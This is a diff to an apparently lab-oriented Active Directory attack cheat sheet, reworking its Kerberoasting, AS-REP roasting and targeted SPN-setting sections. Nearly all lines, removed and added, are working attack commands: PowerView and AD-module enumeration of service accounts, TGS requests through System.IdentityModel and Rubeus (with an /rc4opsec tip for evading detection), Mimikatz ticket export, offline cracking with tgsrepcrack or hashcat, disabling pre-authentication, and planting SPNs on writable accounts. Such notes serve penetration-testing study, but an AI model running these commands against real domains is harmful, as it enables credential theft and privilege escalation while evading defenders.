@@ -969,90 +969,82 @@ Get-RemoteCachedAccountHash -Computername dcorp-dc -Verbose
 
 ### Kerberoast
 
-**1. Enumeration with Powerview:**
 ```powershell
+# Kerberoast targets Service Account that are manually created (not the System Managed Service accounts)
+# the reason is that their passwords are rarely changed and easier to crack
+# The requirement here is to have a valid domain account
+
 # Find user accounts used as Service accounts with PowerView
-Get-NetUser SPN           
-```
-**2. Enumeration with AD Module:**
-```powershell
-# Find user accounts used as Service accounts
+Get-DomainUser SPN           
+
+# Or using AD module:
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-```
-**3. Request a TGS:**
-```powershell
-# Request a TGS - Phase 1
+
+# Request a TGS with powershell for MSSQLSvc
 Add-Type -AssemblyNAme System.IdentityModel
-# Request a TGS - Phase 2
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporate.local" 
+
+# alternative TGS request with Rubeus (list accounts and ask TGS)
+# /rc4opsec option is more stealth (only looks for account that only supports RC4_HMAC to avoid downgrade, which is easily detected)
+Rubeus kerberoast /stats
+Rubeus kerberoast /stats /rc4opsec
+Rubeus kerberoast /user:svcadmin /simple
+Rubeus kerberoast /user:svcadmin /simple /rc4opsec
+
+# Alternative:
+Invoke-Kerberoast -Identity svcadmin
+
 # Check if the TGS has been granted
 klist
-```
-**4. Export and crack TGS:**
-```powershell
-# Export all tickets
+
+# Export all Kerberos tickets
 Invoke-Mimikatz -Command '"kerberos::list /export"'
+
 # Crack the Service account password
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi
+# Or with john (after krb2john) or hashcat (mode 13100)
 ```
 
 ### Targeted Kerberoasting AS REPs
 
-**1. Enumeration with Powerview dev Version:**
+
 ```powershell
+# The idea of this is similar to kerberoasting. It can be done also from a non joined machine with impacket
+  
 # Enumerating accounts with Kerberos Preauth disabled
 Get-DomainUser -PreauthNotRequired -Verbose
+
 # Enumerating the permissions for RDPUsers on ACLs using
-Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
-```
-**2. Enumeration with AD Module:**
-```powershell
+Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
 # Enumerating accounts with Kerberos Preauth disabled
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+
 # Set unsolicited pre-authentication for test01 UAC settings
 Set-DomainObject -Identity test01 -XOR @{useraccountcontrol=4194304} -Verbose
-```
-**3. Request encrypted AS REP for offline brute force with John:**
-```powershell
+
 # Request encrypted AS REP
 Get-ASREPHash -UserName VPN1user -Verbose
+
+# Or to enumerate and ask hash for all users that has Preath disabled
+Invoke-ASREPRoast -Verbose 
 ```
 
 ### Targeted Kerberoasting Set SPN
 
-**1. With Powerview dev Version:**
 ```powershell
-# Check if user01 already has a SPN
+# This can be an alternative to reset password to a user we have write access to
+# The idea is to add an SPN to a user we can modify and then Kerberoast the SPN
+
+# Check if user01 already has a SPN (powerview or AD module)
 Get-DomainUser -Identity User01 | select serviceprincipalname
-# Set a SPN for the user
-Set-DomainObject -Identity User01 -Set @{serviceprincipalname='ops/whatever1'}
-```
-**2. With AD Module:**
-```powershell
-# Check if user01 already has a SPN
 Get-ADUser -Identity User01 -Properties serviceprincipalname | select serviceprincipalname
-# Set a SPN for the user
-Set-ADUser -Identity User01 -ServicePrincipalNames @{Add='ops/whatever1'}
-```
-**3. Request a ticket:**
-```powershell
-# Step 1 - Request a ticket
-Add-Type -AssemblyNAme System.IdentityModel
-# Step 2 - Request a ticket
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
-# Check if the ticket has been granted
-klist
-```
-**Example:**
 
-![Main Logo](images/Example_SPN01.png 'Example03')
+# Set a SPN for the user (powerview or AD module)
+Set-DomainObject -Identity User01 -Set @{serviceprincipalname='dcorp/whatever1'}
+Set-ADUser -Identity User01 -ServicePrincipalNames @{Add='dcorp/whatever1'}
 
-**4. Export all tickets and Bruteforce the password:**
-```powershell
-# Export all tickets using Mimikatz
-Invoke-Mimikatz -Command '"kerberos::list /export"'
-# Brute force the password with tgsrepcrack
-python.exe .\kerberoast\tgsrepcrack.py .\kerberoast\wordlists.txt '.\3-40a10000-user01@ops~whatever1-CORP.CORPORATE.LOCAL.kirbi'
+# Then kerberoast as usual
 ```
 
 ### Kerberos Delegation
